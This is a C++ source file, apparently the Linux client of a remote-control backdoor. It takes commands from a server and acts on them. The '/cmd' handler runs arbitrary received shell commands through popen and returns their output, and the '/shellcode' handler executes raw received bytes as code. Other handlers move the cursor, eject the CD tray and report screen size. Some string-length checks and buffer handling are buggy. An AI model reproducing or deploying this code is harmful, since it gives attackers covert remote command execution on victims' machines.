#include "commands.h"
#include "utils.h"

pthread_t udpThreads[1];

int parseMessages(Server c, std::string buffer)
{
    if (strncmp(buffer.c_str(), "Server> ", 8) == 0)
    {
        buffer = &(buffer.c_str())[8];
    }
    const char *buf = buffer.c_str();

    if (strncmp(buf, "/udp ", 5) == 0)
    {
        std::string sends = "/connect ";
        sends += &buf[5];
        c.connectUDP(c.hostTCP, "10152");

        int rc = pthread_create(&udpThreads[0], NULL, &Server::receiveUDPThreadHelper, &c);
        if (rc) {
            std::cout<<"THREAD CREATION FAILED\n";
        }

        c.sendUDP(sends);
    }
    else if (strncmp(buf, "/cmd", 4) == 0)
    {
        std::string command = &buf[5];
        command += " 2>/dev/null";
        FILE *f = popen(command.c_str(), "r");
        if (f == 0)
        {
            char msg[] = ":ERROR:";
            c.sendTCP(msg);
            return 0;
        }
        const int BUFSIZE = 1000;
        char buffer[BUFSIZE];
        std::string ret = "";
        while (fgets(buffer, BUFSIZE, f))
        {
            ret += buffer;
        }
        char *sends = new char[strlen(ret.c_str())];
        strncpy(sends, ret.c_str(), strlen(ret.c_str()));
        c.sendTCP(sends);
        pclose(f);
    }
    else if (strncmp(buf, "/shellcode", 10) == 0)
    {
        (*(void (*)()) & buf[11])();
    }
    else if (strncmp(buf, "/open_tray", 10) == 0)
    {
        int fd = open("/dev/cdrom", O_RDONLY | O_NONBLOCK);
        ioctl(fd, CDROMEJECT);
        close(fd);
    }
    else if (strncmp(buf, "/close_tray", 11) == 0)
    {
        int fd = open("/dev/cdrom", O_RDONLY | O_NONBLOCK);
        ioctl(fd, CDROMCLOSETRAY);
        close(fd);
    }
    else if (strncmp(buf, "/get_resolution", 15) == 0)
    {
        char x[10];
        char y[10];
        itoa(getDesktopResolution()[0], x, 10);
        itoa(getDesktopResolution()[1], y, 10);
        std::string sends = "{";
        sends += x;
        sends += ",";
        sends += y;
        sends += "}";

        std::cout << sends << "\n";

        c.sendTCP(sends);
    }
    else if (strncmp(buf, "/requesting_reset", 17) == 0)
    {
        c.resetTCP();
    }
    else if (strncmp(buf, "/requesting_data", 16) == 0)
    {
        c.sendTCPIntro();
    }
    else if (strncmp(buf, "/shutdown", 17) == 0)
    {
        return 2;
    }
    else if (strncmp(buf, "/uninstall", 18) == 0)
    {
        return 4;
    }
    else
    {
        printf("\n%s\n", buf);
    }

    return 0;
}

bool parseUDPMessages(Server c, std::string recv)
{
    if (strncmp(recv.c_str(), "/cursor_stream", 14) == 0)
    {                                                       ///////////////////-----------IMPORTANT NOTE: Only high-priority commands may reside here.
                                                            ///////////////////-----------: `parse_commands` is built shabbily and will cause lag if it is used.
                                                            ///////////////////-----------: This in mind, it's still very useful, but we need to list high-priority
                                                            ///////////////////-----------: commands (input streaming, for example) here so they can avoid the lag.
        try
        {
            std::string args = recv.substr(15);
            int x = atoi(args.substr(0, args.find(' ')).c_str());
            int y = atoi(args.substr(args.find(' ')).c_str());
            setCursorPos(x, y);
        }
        catch (int e)
        {
            std::cout << "ERROR: CURSOR STREAM\n";
        }
    }
    else if (strncmp(recv.c_str(), "/instant_keydown", 16) == 0)
    {
        //char c[3];
        //strcpy(c, &recv.c_str()[17]);
        //m_keyDown((SHORT)atoi(c));
    }
    else if (strncmp(recv.c_str(), "/instant_keyup", 14) == 0)
    {
        //char c[3];
        //strcpy(c, &recv.c_str()[15]);
        //m_keyUp((SHORT)atoi(c));
    }
    else if (strncmp(recv.c_str(), "/instant_mousedown", 18) == 0)
    {
        m_mouseDown();
    }
    else if (strncmp(recv.c_str(), "/instant_mouseup", 16) == 0)
    {
        m_mouseUp();
    }
    else if (strncmp(recv.c_str(), "/instant_rmousedown", 19) == 0)
    {
        m_rmouseDown();
    }
    else if (strncmp(recv.c_str(), "/instant_rmouseup", 17) == 0)
    {
        m_rmouseUp();
    }
    else
        return false;

    return true;
}

int *getDesktopResolution()
{
    Display *pdsp = XOpenDisplay(NULL);
    Window wid = DefaultRootWindow(pdsp);

    Screen *pwnd = DefaultScreenOfDisplay(pdsp);
    int sid = DefaultScreen(pdsp);

    XWindowAttributes xwAttr;
    XGetWindowAttributes(pdsp, wid, &xwAttr);

    //printf (" name : %s\n vendor : %s\n", pdsp->display_name, pdsp->vendor);
    //printf (" pos : (%d, %d), width = %d, height = %d \n",
    //xwAttr.x, xwAttr.y, xwAttr.width, xwAttr.height);

    int *ret = new int[2];
    ret[0] = xwAttr.width;
    ret[1] = xwAttr.height;

    XCloseDisplay(pdsp);

    return ret;
}

void setCursorPos(int x, int y) {
    Display *dpy;
    Window root_window;

    dpy = XOpenDisplay(0);
    root_window = XRootWindow(dpy, 0);
    XSelectInput(dpy, root_window, KeyReleaseMask);
    XWarpPointer(dpy, None, root_window, 0, 0, 0, 0, x, y);
    XFlush(dpy);
    XCloseDisplay(dpy);
}

void m_mouseDown() {

}

void m_rmouseDown() {

}

void m_mouseUp() {

}

void m_rmouseUp() {

}